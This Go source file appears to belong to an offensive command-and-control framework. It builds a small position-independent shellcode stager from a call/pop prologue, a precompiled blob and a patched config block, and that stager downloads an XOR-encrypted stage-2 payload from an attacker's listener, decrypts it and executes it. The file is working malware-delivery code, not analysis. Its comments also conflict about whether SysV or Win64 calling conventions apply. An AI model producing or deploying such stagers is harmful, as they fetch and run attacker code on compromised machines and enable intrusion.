// Package stager builds a tiny position-independent HTTP stager shellcode
// (~2.3 KB) that fetches the XOR-encrypted stage-2 blob from /stage/<token>,
// decrypts it and jumps to it. The blob layout:
//
//	[ prologue (18 bytes) ][ stagerBlob ][ config ]
//
// The prologue (written below) locates its own address via call/pop, then sets
// RCX = &config (SysV ABI first argument, matching the gcc-compiled stager_main)
// and jumps to stager_main. All config values (ip/port/key/path) are patched in
// the appended config block, so the same blob template is reused per-stager.
package stager

import (
	"encoding/binary"
	"fmt"
	"net"
	"strconv"
	"strings"
)

// prologueSize is the fixed size of the generated entry prologue.
const prologueSize = 18

// prologue is the position-independent entry: it discovers its own address,
// then loads RCX = &config (Win64 ABI first argument, matching the mingw64
// gcc-compiled stager_main) and jumps to stager_main. Two 32-bit displacements
// are patched at build time:
//
//	disp[9:13]  = configOff - 5   (RCX = blob+5+disp => &config)
//	disp[14:18] = stagerEntry     (jmp is at offset 13, next insn at 18)
var prologue = []byte{
	0xE8, 0x00, 0x00, 0x00, 0x00, // call $+5
	0x58,                                     // pop rax
	0x48, 0x8D, 0x88, 0x00, 0x00, 0x00, 0x00, // lea rcx, [rax + d32]
	0xE9, 0x00, 0x00, 0x00, 0x00, // jmp stager_main
}

// magicWISP is the first field of the config block; the stager does not check
// it, it exists as a debug / validation marker in the emitted blob.
const magicWISP = 0x50534957 // "WISP" little-endian

// Config describes the values baked into a stager.
type Config struct {
	// IP is the listener address (IPv4 literal).
	IP net.IP
	// Port is the listener port.
	Port int
	// Key is the XOR key used for stage-2 decryption (32 bytes).
	Key []byte
	// Path is the stage URL path, e.g. "/stage/<token>?raw=1".
	Path string
}

// configSize is the on-wire size of the config block:
// magic(4) ip(4) port(2) key(32) path(128).
const configSize = 4 + 4 + 2 + 32 + 128

// Build returns a ready-to-run stager blob for the given config.
func Build(cfg Config) ([]byte, error) {
	if len(cfg.IP) != 4 {
		return nil, fmt.Errorf("stager: IPv4 address required (got %q)", cfg.IP)
	}
	if cfg.Port < 1 || cfg.Port > 65535 {
		return nil, fmt.Errorf("stager: invalid port %d", cfg.Port)
	}
	if len(cfg.Key) != 32 {
		return nil, fmt.Errorf("stager: key must be 32 bytes (got %d)", len(cfg.Key))
	}
	if len(cfg.Path) == 0 || len(cfg.Path) > 127 {
		return nil, fmt.Errorf("stager: path must be 1..127 bytes")
	}

	configOff := prologueSize + len(stagerBlob)

	blob := make([]byte, 0, prologueSize+len(stagerBlob)+configSize)
	blob = append(blob, prologue...)
	blob = append(blob, stagerBlob...)
	blob = append(blob, make([]byte, configSize)...)

	binary.LittleEndian.PutUint32(blob[9:13], uint32(configOff-5))
	binary.LittleEndian.PutUint32(blob[14:18], uint32(stagerEntry))

	// Config block
	binary.LittleEndian.PutUint32(blob[configOff:configOff+4], magicWISP)
	copy(blob[configOff+4:configOff+8], cfg.IP)
	binary.LittleEndian.PutUint16(blob[configOff+8:configOff+10], uint16(cfg.Port))
	copy(blob[configOff+10:configOff+42], cfg.Key)
	copy(blob[configOff+42:configOff+170], []byte(cfg.Path))

	return blob, nil
}

// Describe returns the geometry of a built blob (for tests / diagnostics).
func Describe(blob []byte) (configOff, size int) {
	return prologueSize + len(stagerBlob), len(blob)
}

// DefaultPath builds the stage request path for a token.
func DefaultPath(token string) string {
	return "/stage/" + token
}

// ResolveIP resolves a listener host into a 4-byte IPv4 address. Hosts that
// are already IPv4 literals are used directly; hostnames are resolved via DNS.
func ResolveIP(host string) (net.IP, error) {
	if ip := net.ParseIP(host); ip != nil {
		if v4 := ip.To4(); v4 != nil {
			return v4, nil
		}
		return nil, fmt.Errorf("stager: IPv6 listeners unsupported (%s)", host)
	}
	ips, err := net.LookupIP(host)
	if err != nil {
		return nil, fmt.Errorf("stager: resolve %q: %w", host, err)
	}
	for _, ip := range ips {
		if v4 := ip.To4(); v4 != nil {
			return v4, nil
		}
	}
	return nil, fmt.Errorf("stager: no IPv4 address for %q", host)
}

// Addr is a small helper for building the Host header display (ip:port).
func Addr(ip net.IP, port int) string {
	return net.JoinHostPort(ip.String(), strconv.Itoa(port))
}

// ParseURL splits an http URL into host:port and path for stager building.
// Only IPv4 hosts are supported by the tiny stager.
func ParseURL(u string) (host string, port int, path string, err error) {
	rest := u
	for _, prefix := range []string{"http://", "https://"} {
		if strings.HasPrefix(rest, prefix) {
			rest = rest[len(prefix):]
			break
		}
	}
	slash := strings.Index(rest, "/")
	var hp string
	if slash >= 0 {
		hp, path = rest[:slash], rest[slash:]
	} else {
		hp, path = rest, "/"
	}
	if path == "" {
		path = "/"
	}
	if h, p, ok := splitHostPort(hp); ok {
		return h, p, path, nil
	}
	return hp, defaultPort(rest), path, nil
}

func splitHostPort(hp string) (string, int, bool) {
	if strings.HasPrefix(hp, "[") {
		return "", 0, false // IPv6 unsupported
	}
	idx := strings.LastIndex(hp, ":")
	if idx < 0 {
		return "", 0, false
	}
	p, err := strconv.Atoi(hp[idx+1:])
	if err != nil || p < 1 || p > 65535 {
		return "", 0, false
	}
	return hp[:idx], p, true
}

func defaultPort(_ string) int { return 80 }
